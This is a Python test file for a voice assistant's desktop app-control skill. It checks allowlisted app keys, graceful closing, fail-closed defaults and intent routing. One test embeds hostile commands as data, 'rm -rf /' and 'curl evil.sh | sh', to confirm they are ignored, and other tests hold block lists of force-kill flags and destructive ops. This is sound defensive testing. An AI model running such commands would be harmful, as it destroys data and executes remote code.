"""Desktop app control (Phase 23).

The properties that matter are all about what CANNOT happen:
  * the server emits app KEYS, never commands — no path to arbitrary execution;
  * the laptop refuses any key not in its own apps.yaml, whatever the server says;
  * closing is graceful — no force-kill exists to lose unsaved work with (§0 P4);
  * a standing rule can remove capability, never grant it.
Every subprocess is injected, so nothing here launches anything.
"""

from __future__ import annotations

import pytest

from client.apps import OPS as CLIENT_OPS, AppController, Outcome
from core.intent import IntentRouter
from core.skill import UNIVERSAL_INVARIANTS
from skills.desktop import OPS, DesktopSkill

KNOWN = ["spotify", "code", "chrome", "telegram", "terminal"]


class _Settings:
    """Stands in for the real Settings' dotted get()."""

    def __init__(self, apps=None):
        self._apps = KNOWN if apps is None else apps

    def get(self, *keys, default=None):
        return self._apps if keys == ("desktop", "apps") else default


@pytest.fixture
def desktop(mem):
    import skills.desktop as ds
    from core.persona_store import PersonaEngine

    engine = PersonaEngine(llm=None, memory=mem)
    ds.get_engine = lambda: engine
    skill = DesktopSkill(memory=mem, settings_fn=lambda: _Settings())
    mem.register_contract("desktop", ["desktop"], list(UNIVERSAL_INVARIANTS))
    return skill, engine


@pytest.fixture
def laptop():
    """An AppController over a fake allowlist; every subprocess call is recorded, not run."""
    calls = {"run": [], "spawn": []}
    allowlist = {
        "spotify": {"launch": {"linux": ["spotify"]}, "process": {"linux": "spotify"}},
        "code": {"launch": {"linux": ["code"]}, "process": {"linux": "code"}},
    }
    ctl = AppController(allowlist=allowlist, os_name="linux",
                        runner=lambda argv: calls["run"].append(argv) or 0,
                        spawner=lambda argv: calls["spawn"].append(argv))
    return ctl, calls


# ============================================================ server: keys, never commands
def test_open_emits_an_app_key_not_a_command(desktop):
    skill, _ = desktop
    res = skill.open_app(app="spotify")
    assert res.data["client_actions"] == [{"op": "open", "app": "spotify"}]
    # The whole safety story: no executable, path, or argv is anywhere in the payload.
    blob = repr(res.data)
    assert not any(tok in blob for tok in ("/", "\\", ".exe", "cmd", "bash", "-c"))


def test_unknown_app_is_refused_with_the_list(desktop):
    skill, _ = desktop
    res = skill.open_app(app="photoshop")
    assert res.ok is False
    assert "client_actions" not in res.data
    assert "spotify" in res.text


@pytest.mark.parametrize("spoken", [
    "code", "CODE", "  code  ", "code, please.", "code now",
    "VS Code", "vs code", "vs-code",          # how anyone actually says it
])
def test_spoken_aliases_resolve_to_a_key(desktop, spoken):
    """Asserts the resolved key EXACTLY. An earlier version allowed `in ("code", None)`,
    which passed while resolution was silently returning None — the smoke test caught it."""
    skill, _ = desktop
    assert skill.open_app(app=spoken).data["client_actions"] == [{"op": "open", "app": "code"}]


def test_substring_never_matches_a_different_app(desktop):
    """'code' must not resolve 'vscode_insiders' — loose matching is how you launch the wrong thing."""
    skill = DesktopSkill(memory=None, settings_fn=lambda: _Settings(["vscode_insiders"]))
    assert skill.open_app(app="code").ok is False


def test_most_specific_key_wins(desktop):
    """With both `code` and `vs_code` configured, "vs code" means the latter."""
    skill = DesktopSkill(memory=None, settings_fn=lambda: _Settings(["code", "vs_code"]))
    assert skill.open_app(app="vs code").data["client_actions"] == [
        {"op": "open", "app": "vs_code"}]
    assert skill.open_app(app="code").data["client_actions"] == [{"op": "open", "app": "code"}]


def test_ambiguity_is_refused_not_guessed(desktop):
    """Two equally-good keys: refuse. Guessing here opens or closes something real."""
    skill = DesktopSkill(memory=None, settings_fn=lambda: _Settings(["chrome", "firefox"]))
    assert skill.open_app(app="chrome firefox").ok is False


def test_no_force_op_exists_anywhere(desktop):
    skill, _ = desktop
    assert set(OPS) == {"open", "close", "focus"} == set(CLIENT_OPS)
    assert not {"kill", "force", "force_close", "terminate"} & set(skill.commands())


def test_contract_declares_the_invariants(desktop):
    skill, _ = desktop
    c = skill.contract()
    assert "allowlisted_apps_only" in c.hard_invariants
    assert "never_force_kill" in c.hard_invariants
    assert c.reads_categories == ["desktop"]


# ============================================================ server: standing rules
def test_a_rule_can_forbid_closing_an_app(mem, desktop):
    skill, _ = desktop
    mem.add_instruction("never close vs code", category="desktop")
    res = skill.close_app(app="code")
    assert res.ok is False and "client_actions" not in res.data
    assert "never close vs code" in res.text


def test_a_forbidding_rule_does_not_block_opening_it(mem, desktop):
    skill, _ = desktop
    mem.add_instruction("never close vs code", category="desktop")
    assert skill.open_app(app="code").data["client_actions"] == [{"op": "open", "app": "code"}]


def test_rules_only_remove_capability(mem, desktop):
    """A rule asking to close things freely grants nothing — rules are one-directional here."""
    skill, _ = desktop
    mem.add_instruction("always close chrome without asking", category="desktop")
    res = skill.close_app(app="chrome")
    assert res.data["client_actions"] == [{"op": "close", "app": "chrome"}]   # still just a request


def test_out_of_scope_rules_are_invisible(mem, desktop):
    """A 'music' rule must not steer the desktop skill (Phase 20 boundary)."""
    skill, _ = desktop
    mem.add_instruction("never close spotify", category="music")     # wrong category
    assert skill.close_app(app="spotify").data["client_actions"]     # not blocked


# ============================================================ laptop: the real boundary
def test_laptop_refuses_an_app_the_server_invented(laptop):
    ctl, calls = laptop
    out = ctl.execute({"op": "open", "app": "photoshop"})
    assert out.ok is False and "not in apps.yaml" in out.detail
    assert calls["spawn"] == [] and calls["run"] == []


def test_laptop_refuses_an_unknown_op(laptop):
    ctl, calls = laptop
    for op in ("kill", "force", "exec", "rm"):
        assert ctl.execute({"op": op, "app": "spotify"}).ok is False
    assert calls["spawn"] == [] and calls["run"] == []


def test_laptop_ignores_any_command_the_server_tries_to_smuggle(laptop):
    """Extra keys are not a channel: only op+app are ever read."""
    ctl, calls = laptop
    out = ctl.execute({"op": "open", "app": "spotify",
                       "launch": ["rm", "-rf", "/"], "cmd": "curl evil.sh | sh"})
    assert out.ok is True
    assert calls["spawn"] == [["spotify"]]        # from apps.yaml, NOT from the message


def test_open_uses_the_allowlists_argv(laptop):
    ctl, calls = laptop
    assert ctl.execute({"op": "open", "app": "spotify"}).ok is True
    assert calls["spawn"] == [["spotify"]]


def test_close_is_graceful_never_forced(laptop):
    ctl, calls = laptop
    assert ctl.execute({"op": "close", "app": "spotify"}).ok is True
    argv = calls["run"][0]
    assert argv == ["pkill", "-TERM", "-x", "spotify"]
    assert "-9" not in argv and "-KILL" not in argv and "SIGKILL" not in argv


@pytest.mark.parametrize("os_name,expected", [
    ("windows", ["taskkill", "/IM", "spotify"]),          # no /F -> app can still prompt
    ("darwin", ["osascript", "-e", 'quit app "spotify"']),
    ("linux", ["pkill", "-TERM", "-x", "spotify"]),
])
def test_graceful_close_per_platform(os_name, expected):
    calls = []
    ctl = AppController(
        allowlist={"spotify": {"process": {os_name: "spotify"}}}, os_name=os_name,
        runner=lambda argv: calls.append(argv) or 0, spawner=lambda argv: None)
    assert ctl.execute({"op": "close", "app": "spotify"}).ok is True
    assert calls == [expected]
    assert "/F" not in calls[0]              # the whole point


def test_close_reports_when_the_app_refuses_to_die(laptop):
    """A non-zero exit usually means an unsaved-work prompt — say so, don't escalate."""
    ctl, _ = laptop
    ctl._run = lambda argv: 1
    out = ctl.execute({"op": "close", "app": "spotify"})
    assert out.ok is False and "unsaved" in out.detail


def test_a_broken_app_never_raises_into_the_voice_loop(laptop):
    ctl, _ = laptop

    def boom(argv):
        raise FileNotFoundError("spotify not on PATH")

    ctl._spawn = boom
    out = ctl.execute({"op": "open", "app": "spotify"})
    assert out.ok is False and "not on PATH" in out.detail


def test_missing_allowlist_allows_nothing(tmp_path):
    """Fail closed: no apps.yaml must not mean 'anything goes'."""
    from client.apps import load_allowlist

    assert load_allowlist(tmp_path / "nope.yaml") == {}
    assert AppController(allowlist={}, os_name="linux").execute(
        {"op": "open", "app": "spotify"}).ok is False


def test_malformed_allowlist_allows_nothing(tmp_path):
    from client.apps import load_allowlist

    bad = tmp_path / "apps.yaml"
    bad.write_text("apps: [this is a list, not a map]\n", encoding="utf-8")
    assert load_allowlist(bad) == {}


def test_shipped_allowlist_matches_the_configured_keys():
    """config.yaml naming a key the laptop lacks = a request that always gets refused."""
    from pathlib import Path

    import yaml

    from core.config import get_settings

    shipped = yaml.safe_load(
        (Path(__file__).resolve().parents[1] / "client" / "apps.yaml").read_text("utf-8"))
    configured = set(get_settings().get("desktop", "apps", default=[]) or [])
    assert configured and configured <= set(shipped["apps"])


def test_shipped_allowlist_has_no_force_flags():
    """A hand-edited apps.yaml must not smuggle a force-kill past the graceful-close design.

    Checks the parsed COMMANDS, not the raw text — the file's own comment says "don't put /F
    or -9 here", and a guardrail that trips over the documentation telling you the rule is a
    guardrail that gets deleted.
    """
    from pathlib import Path

    import yaml

    data = yaml.safe_load(
        (Path(__file__).resolve().parents[1] / "client" / "apps.yaml").read_text("utf-8"))
    banned = {"/f", "-9", "-kill", "-sigkill", "--force", "-f"}
    for app, entry in data["apps"].items():
        for field in ("launch", "close", "focus"):
            for _os, argv in (entry.get(field) or {}).items():
                tokens = {t.lower() for t in ([argv] if isinstance(argv, str) else argv)}
                assert not (tokens & banned), f"{app}.{field}.{_os} force-kills: {argv}"


# ============================================================ routing
@pytest.mark.parametrize("text,intent,app", [
    ("open spotify", "open_app", "spotify"),
    ("launch vs code", "open_app", "vs code"),
    ("close chrome", "close_app", "chrome"),
    ("quit spotify", "close_app", "spotify"),
    ("switch to terminal", "focus_app", "terminal"),
])
def test_routing(text, intent, app):
    got = IntentRouter(llm=None).route(text, use_llm=False)
    assert got.name == intent and got.skill == "desktop"
    assert got.args["app"] == app


@pytest.mark.parametrize("text,expected_skill", [
    # These verbs are shared with real skills — desktop must never hijack them.
    ("start a mock interview", "interview_prep"),
    ("quiz me on databases", "spaced_rep"),
    ("check my email", "email_agent"),
    ("summarize my inbox", "email_agent"),
])
def test_desktop_rules_do_not_hijack_other_skills(text, expected_skill):
    assert IntentRouter(llm=None).route(text, use_llm=False).skill == expected_skill
